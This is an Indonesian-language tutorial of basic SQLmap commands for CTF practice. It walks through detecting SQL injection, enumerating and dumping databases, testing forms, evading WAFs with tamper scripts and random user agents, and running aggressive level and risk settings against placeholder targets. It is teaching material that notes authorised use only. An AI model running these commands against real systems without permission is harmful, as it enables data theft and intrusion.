# Basic Commands SQLmap

Dokumen ini berisi command-command fundamental SQLmap yang wajib dipahami. Setiap command disertai kegunaan dan logika di baliknya.

---

## Struktur Dasar

```
sqlmap -u "URL" [options]
```

`-u` adalah flag untuk menentukan target URL. Ini selalu jadi titik awal.

---

## 1. Scan Dasar

```bash
sqlmap -u "http://target.com/index.php?id=1"
```

**Kegunaan:** Scan awal untuk mendeteksi apakah parameter `id` vulnerable terhadap SQL injection.

**Logika:** SQLmap akan mengirim berbagai payload ke parameter `id` dan menganalisis response server. Kalau ada perbedaan response yang mencurigakan, SQLmap menandai parameter tersebut sebagai injectable.

---

## 2. Lihat Semua Database

```bash
sqlmap -u "http://target.com/index.php?id=1" --dbs
```

**Kegunaan:** Setelah konfirmasi vulnerable, perintah ini mengekstrak daftar semua database yang ada di server.

**Logika:** SQLmap mengeksploitasi celah yang ditemukan untuk menjalankan query `SHOW DATABASES` atau equivalentnya, lalu mengembalikan hasilnya ke attacker.

---

## 3. Lihat Tabel dalam Database

```bash
sqlmap -u "http://target.com/index.php?id=1" -D nama_database --tables
```

**Kegunaan:** Melihat semua tabel yang ada di dalam database tertentu.

**Logika:** `-D` menentukan database target. SQLmap kemudian query `information_schema` untuk mendapatkan daftar tabel di database tersebut.

---

## 4. Lihat Kolom dalam Tabel

```bash
sqlmap -u "http://target.com/index.php?id=1" -D nama_database -T nama_tabel --columns
```

**Kegunaan:** Melihat struktur kolom dari sebuah tabel sebelum mengekstrak datanya.

**Logika:** Penting untuk dilakukan sebelum dump, supaya tahu kolom mana yang berisi data yang dicari (contoh: kolom `flag`, `password`, `username`).

---

## 5. Dump Isi Tabel

```bash
sqlmap -u "http://target.com/index.php?id=1" -D nama_database -T nama_tabel --dump
```

**Kegunaan:** Mengekstrak seluruh isi tabel.

**Logika:** Ini command inti yang paling sering dipakai di CTF. Flag biasanya tersimpan di dalam tabel database, dan `--dump` akan mengeluarkan semua isinya.

---

## 6. Test pada Form (POST Request)

```bash
sqlmap -u "http://target.com/login" --data="username=admin&password=1234"
```

**Kegunaan:** Menguji form yang menggunakan POST request, bukan parameter di URL.

**Logika:** `--data` digunakan untuk mengirim POST data, mensimulasikan submit form. SQLmap akan mencoba inject payload ke setiap field yang ada.

---

## 7. Crawl dan Auto-detect Form

```bash
sqlmap -u "http://target.com/" --forms --crawl=2
```

**Kegunaan:** Ketika tidak ada parameter di URL, SQLmap akan merayapi website sampai kedalaman 2 halaman dan otomatis mendeteksi form yang bisa ditest.

**Logika:** `--crawl=2` artinya SQLmap ikuti link sampai 2 level kedalaman. `--forms` artinya SQLmap otomatis submit dan test setiap form yang ditemukan.

---

## 8. Bypass WAF dengan Tamper Script

```bash
sqlmap -u "http://target.com/index.php?id=1" --tamper=space2comment
```

**Kegunaan:** Mencoba bypass Web Application Firewall (WAF) yang memblokir payload standar.

**Logika:** Tamper script memodifikasi payload sebelum dikirim. `space2comment` mengganti spasi dengan `/**/` sehingga payload terlihat berbeda di mata WAF tapi tetap valid secara SQL.

Tamper script lain yang umum:
- `between` - mengganti `>` dengan `NOT BETWEEN`
- `randomcase` - mengacak huruf besar/kecil
- `charencode` - encode karakter dengan URL encoding

---

## 9. Random User-Agent

```bash
sqlmap -u "http://target.com/index.php?id=1" --random-agent
```

**Kegunaan:** Mengganti User-Agent header secara random untuk menghindari deteksi.

**Logika:** Beberapa WAF memblokir request dengan User-Agent default SQLmap. Flag ini membuat request terlihat seperti browser biasa.

---

## 10. Tingkatkan Level dan Risk

```bash
sqlmap -u "http://target.com/index.php?id=1" --level=5 --risk=3
```

**Kegunaan:** Memperluas jangkauan test dengan payload yang lebih agresif.

**Logika:**
- `--level` (1-5): Semakin tinggi, semakin banyak parameter yang ditest (termasuk cookies, headers)
- `--risk` (1-3): Semakin tinggi, semakin berbahaya payload yang digunakan (bisa memodifikasi data)

Default level=1 dan risk=1. Naikkan kalau scan awal tidak menemukan apa-apa.

---

## 11. Simpan dan Lanjutkan Session

```bash
sqlmap -u "http://target.com/index.php?id=1" --batch
```

**Kegunaan:** Menjalankan SQLmap tanpa interaksi manual — semua pertanyaan dijawab otomatis dengan default.

**Logika:** Berguna untuk menjalankan SQLmap di background atau saat tidak ingin terus-terusan tekan Enter. Di CTF, ini menghemat waktu.

---

## Urutan Workflow di CTF

```
1. Temukan parameter di URL atau form
2. sqlmap -u "URL?param=value"               → konfirmasi vulnerable
3. sqlmap ... --dbs                           → lihat database
4. sqlmap ... -D target_db --tables          → lihat tabel
5. sqlmap ... -D target_db -T target_tbl --dump  → ambil data / flag
```

---

## Catatan

Semua command di atas hanya digunakan pada target yang memiliki izin eksplisit atau environment latihan seperti DVWA, HackTheBox, dan TryHackMe.
